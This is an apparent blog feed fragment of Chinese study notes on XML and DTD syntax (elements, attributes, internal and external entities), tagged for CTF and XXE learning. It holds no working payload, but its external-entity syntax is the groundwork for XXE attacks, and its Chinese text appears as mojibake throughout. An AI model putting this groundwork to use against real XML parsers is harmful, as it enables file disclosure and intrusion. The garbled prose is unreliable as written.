href="#å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ " class="headerlink" title="å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ "></a>å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ </h3><p>å¸¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­å…ƒç´ çš„å…ƒç´ é€šè¿‡åœ†æ‹¬å·ä¸­çš„å­å…ƒç´ åè¿›è¡Œå£°æ˜ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° (å­å…ƒç´ åç§° 1)&gt;</span><br><span class="line">2âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° (å­å…ƒç´ åç§° 1,å­å…ƒç´ åç§° 2,.....)&gt; &lt;!--ç”±é€—å·åˆ†éš”å¼€çš„åºåˆ—è¿›è¡Œå£°æ˜å¹¶ä¸”æŒ‰ç…§ç›¸åŒçš„é¡ºåºå‡ºç°åœ¨XMLæ–‡æ¡£ä¸­--&gt;</span><br></pre></td></tr></table></figure></div><h4 id="ä¸åŒçš„å…ƒç´ å£°æ˜"><a href="#ä¸åŒçš„å…ƒç´ å£°æ˜" class="headerlink" title="ä¸åŒçš„å…ƒç´ å£°æ˜"></a>ä¸åŒçš„å…ƒç´ å£°æ˜</h4><ul><li><p>å­å…ƒç´ åªå‡ºç°ä¸€æ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°)&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>å­å…ƒç´ å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°<span class="string">?)</span>&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>å­å…ƒç´ å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°*)&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>å­å…ƒç´ å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°+)&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>å­å…ƒç´ ä¸ºå¤šé€‰ä¸€ç±»å‹ï¼šè¯­æ³•ä¸ºï¼š</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°<span class="number">1</span>|<span class="params">å…ƒç´ åç§°2</span>|å­å…ƒç´ åç§°<span class="number">3</span>|<span class="params">...)&gt;</span></span><br><span class="line"><span class="params"># è¿™é‡Œåˆ™ä¸éœ€è¦éµå¾ªå­å…ƒç´ å‡ºç°çš„é¡ºåºæ¥å†™å£°æ˜ï¼Œåªéœ€åŒ…å«æ‰€æœ‰å¯èƒ½å‡ºç°çš„å­å…ƒç´ å³å¯ï¼ˆä¹Ÿå¯ä»¥æ·»åŠ ä¸€äº›ä¸å¯èƒ½å‡ºç°çš„å…ƒç´ ï¼Œå½“ç„¶è¿™æ ·å†™å¹¶æ²¡æœ‰å¿…è¦)</span></span><br><span class="line"><span class="params"># åªèƒ½å‡ºç°ä¸€ä¸ªï¼Œä¸ç„¶ä¼šæŠ¥é”™</span></span><br></pre></td></tr></table></figure></div></li><li><p>å¤šç§ç±»å‹çš„å­å…ƒç´ æ··åˆï¼šä¸¾ä¸ªä¾‹å­ï¼š</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> book (name,author?,(price|<span class="params">press</span>|date)*)&gt;</span><br></pre></td></tr></table></figure></div></li></ul><p>è¿™ä¸ªå£°æ˜çš„å«ä¹‰ä¸ºï¼š<code>book</code>å…ƒç´ åŒ…å«åªå‡ºç°ä¸€æ¬¡çš„<code>name</code>å­å…ƒç´ ã€å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡çš„<code>author</code>å­å…ƒç´ ä»¥åŠå‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„<code>price</code>ã€<code>press</code>ã€<code>date</code>ä¸‰ä¸ªå­å…ƒç´ ä¸­çš„ä¸€ä¸ª</p><blockquote><p>å¯¹äº<code>?</code>ã€<code>*</code>ä»¥åŠ<code>+</code>è¿™ä¸‰ä¸ªç¬¦å·çš„å«ä¹‰ï¼Œå¯ä»¥ç±»æ¯”äºæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè®°å¿†</p></blockquote><h2 id="å±æ€§å£°æ˜"><a href="#å±æ€§å£°æ˜" class="headerlink" title="å±æ€§å£°æ˜"></a>å±æ€§å£°æ˜</h2><h3 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ é»˜è®¤å€¼&gt;</span><br></pre></td></tr></table></figure></div><p>DTD å®ä¾‹:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML å®ä¾‹:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payment</span> <span class="attr">type</span>=<span class="string">&quot;check&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>ä»¥ä¸‹æ˜¯<strong>å±æ€§ç±»å‹</strong>çš„é€‰é¡¹ï¼š</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">CDATA</td><td align="left">å€¼ä¸ºå­—ç¬¦æ•°æ® (character data)</td></tr><tr><td align="left">(<em>en1</em>|<em>en2</em>|..)</td><td align="left">æ­¤å€¼æ˜¯æšä¸¾åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå€¼</td></tr><tr><td align="left">ID</td><td align="left">å€¼ä¸ºå”¯ä¸€çš„ id</td></tr><tr><td align="left">IDREF</td><td align="left">å€¼ä¸ºå¦å¤–ä¸€ä¸ªå…ƒç´ çš„ id</td></tr><tr><td align="left">IDREFS</td><td align="left">å€¼ä¸ºå…¶ä»– id çš„åˆ—è¡¨</td></tr><tr><td align="left">NMTOKEN</td><td align="left">å€¼ä¸ºåˆæ³•çš„ XML åç§°</td></tr><tr><td align="left">NMTOKENS</td><td align="left">å€¼ä¸ºåˆæ³•çš„ XML åç§°çš„åˆ—è¡¨</td></tr><tr><td align="left">ENTITY</td><td align="left">å€¼æ˜¯ä¸€ä¸ªå®ä½“</td></tr><tr><td align="left">ENTITIES</td><td align="left">å€¼æ˜¯ä¸€ä¸ªå®ä½“åˆ—è¡¨</td></tr><tr><td align="left">NOTATION</td><td align="left">æ­¤å€¼æ˜¯ç¬¦å·çš„åç§°</td></tr><tr><td align="left">xml:</td><td align="left">å€¼æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„ XML å€¼</td></tr></tbody></table><p>é»˜è®¤å€¼å‚æ•°å¯ä½¿ç”¨ä¸‹åˆ—å€¼ï¼š</p><table><thead><tr><th align="left">å€¼</th><th align="left">è§£é‡Š</th></tr></thead><tbody><tr><td align="left">å€¼</td><td align="left">å±æ€§çš„é»˜è®¤å€¼</td></tr><tr><td align="left">#REQUIRED</td><td align="left">å±æ€§å€¼æ˜¯å¿…éœ€çš„</td></tr><tr><td align="left">#IMPLIED</td><td align="left">å±æ€§ä¸æ˜¯å¿…éœ€çš„</td></tr><tr><td align="left">#FIXED value</td><td align="left">å±æ€§å€¼æ˜¯å›ºå®šçš„</td></tr></tbody></table><p>ğŸŒ°â€“è§„å®šä¸€ä¸ªé»˜è®¤çš„å±æ€§å€¼</p><p>DTD: ç»™squareå…ƒç´ è§„å®šäº†ä¸€ä¸ªé»˜è®¤å€¼ä¸º0çš„widthå±æ€§,â€squareâ€ è¢«å®šä¹‰ä¸ºå¸¦æœ‰ CDATA ç±»å‹çš„ â€œwidthâ€ å±æ€§çš„ç©ºå…ƒç´ </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT square EMPTY&gt;</span><br><span class="line">&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>åˆæ³•çš„ XML: ä»å¯ä»¥ç»™è¢«é¢„å®šä¹‰çš„å±æ€§èµ‹å€¼</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="IMPLIED"><a href="#IMPLIED" class="headerlink" title="#IMPLIED"></a>#IMPLIED</h3><p>å±æ€§ä¸æ˜¯å¿…éœ€çš„</p><h4 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ #IMPLIED&gt;</span><br></pre></td></tr></table></figure></div><p>ğŸŒ°</p><p>DTD:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST contact fax CDATA #IMPLIED&gt;</span><br></pre></td></tr></table></figure></div><p>åˆæ³•çš„ XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contact</span> <span class="attr">fax</span>=<span class="string">&quot;555-667788&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>åˆæ³•çš„ XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contact</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="REQUIRED"><a href="#REQUIRED" class="headerlink" title="#REQUIRED"></a>#REQUIRED</h3><p>å±æ€§æ˜¯å¿…éœ€çš„,é€‚ç”¨äºæ²¡æœ‰é»˜è®¤å€¼é€‰é¡¹ï¼Œä½†å¼ºåˆ¶è¦æ±‚æäº¤å±æ€§å€¼</p><h3 id="è¯­æ³•-3"><a href="#è¯­æ³•-3" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ #REQUIRED&gt;</span><br></pre></td></tr></table></figure></div><p>ğŸŒ°</p><p>DTD:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST person number CDATA #REQUIRED&gt;</span><br></pre></td></tr></table></figure></div><p>åˆæ³•çš„ XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">number</span>=<span class="string">&quot;5677&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>éæ³•çš„ XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="FIXED"><a href="#FIXED" class="headerlink" title="#FIXED"></a>#FIXED</h3><p>å±æ€§å€¼å›ºå®š,é¢„å…ˆå®šä¹‰å±æ€§å€¼ï¼Œä¸å¯æ›´æ”¹(ç±»æ¯”const)</p><h3 id="è¯­æ³•-4"><a href="#è¯­æ³•-4" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ #FIXED &quot;value&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>ğŸŒ°</p><p>DTD:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST sender company CDATA #FIXED &quot;Microsoft&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>åˆæ³•çš„ XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sender</span> <span class="attr">company</span>=<span class="string">&quot;Microsoft&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>éæ³•çš„ XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sender</span> <span class="attr">company</span>=<span class="string">&quot;W3School&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="åˆ—ä¸¾å±æ€§å€¼"><a href="#åˆ—ä¸¾å±æ€§å€¼" class="headerlink" title="åˆ—ä¸¾å±æ€§å€¼"></a>åˆ—ä¸¾å±æ€§å€¼</h3><h3 id="è¯­æ³•ï¼š"><a href="#è¯­æ³•ï¼š" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° (en1|en2|..) é»˜è®¤å€¼&gt;</span><br></pre></td></tr></table></figure></div><p>DTD ä¾‹å­:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment type (check|cash) &quot;cash&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML ä¾‹å­:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payment</span> <span class="attr">type</span>=<span class="string">&quot;check&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>æˆ–è€…</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payment</span> <span class="attr">type</span>=<span class="string">&quot;cash&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="å®ä½“å£°æ˜"><a href="#å®ä½“å£°æ˜" class="headerlink" title="å®ä½“å£°æ˜"></a>å®ä½“å£°æ˜</h2><p>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p><p>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><p>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p><h3 id="å†…éƒ¨å®ä½“å£°æ˜"><a href="#å†…éƒ¨å®ä½“å£°æ˜" class="headerlink" title="å†…éƒ¨å®ä½“å£°æ˜"></a>å†…éƒ¨å®ä½“å£°æ˜</h3><h3 id="è¯­æ³•ï¼š-1"><a href="#è¯­æ³•ï¼š-1" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>ğŸŒ°</p><p>DTD ä¾‹å­:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML ä¾‹å­:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· <code>&amp;</code>, ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· <code>;</code></p></blockquote><h3 id="å¤–éƒ¨å®ä½“å£°æ˜"><a href="#å¤–éƒ¨å®ä½“å£°æ˜" class="headerlink" title="å¤–éƒ¨å®ä½“å£°æ˜"></a>å¤–éƒ¨å®ä½“å£°æ˜</h3><h3 id="è¯­æ³•ï¼š-2"><a href="#è¯­æ³•ï¼š-2" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt; &lt;!--ä¹Ÿå¯ä»¥ç”¨åè®®--&gt;</span><br></pre></td></tr></table></figure></div><p>ğŸ’¡ä¸åŒç¯å¢ƒä¸‹å¯ç”¨åè®®</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032236978.jpg"                      alt="aaa"                ><figcaption>aaa</figcaption></figure></p><p>ğŸŒ°</p><p>DTD ä¾‹å­:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML ä¾‹å­:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="å®ä½“çš„åµŒå¥—"><a href="#å®ä½“çš„åµŒå¥—" class="headerlink" title="å®ä½“çš„åµŒå¥—"></a><strong>å®ä½“çš„åµŒå¥—</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %å®ä½“åç§° &quot;å€¼&quot;&gt; &lt;!--å†…éƒ¨--&gt;</span><br><span class="line">&lt;!ENTITY %å®ä½“åç§° SYSTEM &quot;URL&quot;&gt; &lt;!--å¤–éƒ¨--&gt;</span><br></pre></td></tr></table></figure></div><h3 id="å®ä½“åˆ†ç±»"><a href="#å®ä½“åˆ†ç±»" class="headerlink" title="å®ä½“åˆ†ç±»"></a>å®ä½“åˆ†ç±»</h3><p>å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“,å­—ç¬¦å®ä½“,å‘½åå®ä½“</p><p>1ï¼Œä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:<!ENTITY å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›</p><p>2ï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š <!ENTITY % å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“åï¼›</p><blockquote><p>æœ‰SYSTEMå…³é”®å­—å¼•ç”¨æ•°æ®çš„å®ä½“å°±æ˜¯å‚æ•°å®ä½“</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMLå­¦ä¹ </title>
      <link href="/2022/04/20/XML%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/20/XML%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p> XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€(<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage),<strong>è¢«è®¾è®¡ç”¨æ¥<u>ä¼ è¾“å’Œå­˜å‚¨æ•°æ®</u></strong> å¯ä»¥ç”¨åœ¨é…ç½®æ–‡ä»¶ä¸­ã€åœ¨ç½‘ç»œä¸­ä¼ è¾“</p><blockquote><p><strong>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®</strong></p></blockquote><ul><li><p>XML æ˜¯ä¸€ç§<em>æ ‡è®°è¯­è¨€</em>ï¼Œå¾ˆç±»ä¼¼ HTML,æ˜¯å¯¹ HTML çš„è¡¥å……</p></li><li><p>XML çš„è®¾è®¡å®—æ—¨æ˜¯<strong>ä¼ è¾“æ•°æ®</strong>ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®</p></li><li><p>XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚æ‚¨éœ€è¦<strong>è‡ªè¡Œå®šä¹‰æ ‡ç­¾</strong>ã€‚(é€šè¿‡ XML å¯ä»¥å‘æ˜è‡ªå·±çš„æ ‡ç­¾)</p></li><li><p>XML è¢«è®¾è®¡ä¸ºå…·æœ‰<em>è‡ªæˆ‘æè¿°æ€§</em>ã€‚</p></li><li><p>XML æ˜¯ <strong>W3C çš„æ¨èæ ‡å‡†</strong></p></li><li><p>XML ä»…ä»…æ˜¯çº¯æ–‡æœ¬</p></li><li><p>XML ç‹¬ç«‹äºç¡¬ä»¶ã€è½¯ä»¶ä»¥åŠåº”ç”¨ç¨‹åº</p></li></ul><h2 id="æ ‘ç»“æ„"><a href="#æ ‘ç»“æ„" class="headerlink" title="æ ‘ç»“æ„"></a>æ ‘ç»“æ„</h2><p>ä¸€ä¸ªæ–‡æ¡£å®ä¾‹(John ç»™ George çš„ä¸€å¼ ä¾¿ç­¾)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span> <span class="comment">&lt;!--XML å£°æ˜ã€‚å®ƒå®šä¹‰ XML çš„ç‰ˆæœ¬ (1.0) å’Œæ‰€ä½¿ç”¨çš„ç¼–ç  (ISO-8859-1 = Latin-1/è¥¿æ¬§å­—ç¬¦é›†)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> <span class="comment">&lt;!--æ ¹å…ƒç´ --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--4 è¡Œæè¿°æ ¹çš„ 4 ä¸ªå­å…ƒç´ ï¼ˆto, from, heading ä»¥åŠ bodyï¼‰--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾  e.g. <note> </note></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªé—­åˆæ ‡ç­¾ e.g.<code> &lt;br/&gt;</code></p><h3 id="ç»„æˆéƒ¨åˆ†"><a href="#ç»„æˆéƒ¨åˆ†" class="headerlink" title="ç»„æˆéƒ¨åˆ†"></a>ç»„æˆéƒ¨åˆ†</h3><h4 id="âš ï¸æ³¨æ„ï¼šxmlç¬¬ä¸€è¡Œå¿…é¡»å®šä¹‰ä¸ºæ–‡æ¡£å£°æ˜"><a href="#âš ï¸æ³¨æ„ï¼šxmlç¬¬ä¸€è¡Œå¿…é¡»å®šä¹‰ä¸ºæ–‡æ¡£å£°æ˜" class="headerlink" title="âš ï¸æ³¨æ„ï¼šxmlç¬¬ä¸€è¡Œå¿…é¡»å®šä¹‰ä¸ºæ–‡æ¡£å£°æ˜"></a>âš ï¸æ³¨æ„ï¼šxmlç¬¬ä¸€è¡Œå¿…é¡»å®šä¹‰ä¸ºæ–‡æ¡£å£°æ˜</h4><p>æ ¼å¼ï¼š<?xml å±æ€§åˆ—è¡¨ ?></p><p>å±æ€§åˆ—è¡¨ï¼š</p><ul><li>versionï¼šç‰ˆæœ¬å·ï¼Œå¿…é¡»çš„å±æ€§</li><li>encodingï¼šç¼–ç æ–¹å¼ã€‚å‘ŠçŸ¥è§£æå¼•æ“å½“å‰æ–‡æ¡£ä½¿ç”¨çš„å­—ç¬¦é›†ï¼Œé»˜è®¤å€¼ï¼šISO-8859-1 